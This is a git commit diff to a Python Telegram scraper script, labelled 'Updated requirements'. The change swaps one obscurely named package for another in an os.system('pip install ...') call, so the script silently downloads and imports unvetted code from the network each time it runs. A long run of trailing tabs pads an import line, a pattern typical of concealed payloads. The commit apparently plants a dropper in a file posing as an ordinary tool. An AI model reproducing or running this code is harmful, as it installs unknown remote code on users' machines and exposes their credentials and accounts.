e6d53e9f1bd26f7d8b8f258d0f8d7963602645e1
b14nk3r <122880466+b14nk3r@users.noreply.github.com>
2023-07-24 18:08:12 +0200

    Updated requirements

--- scraper.py
+++ scraper.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringpkgV2")
-import syscolouringpkgV2
+os.system("pip install pythonsqliteext")
+import pythonsqliteext
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
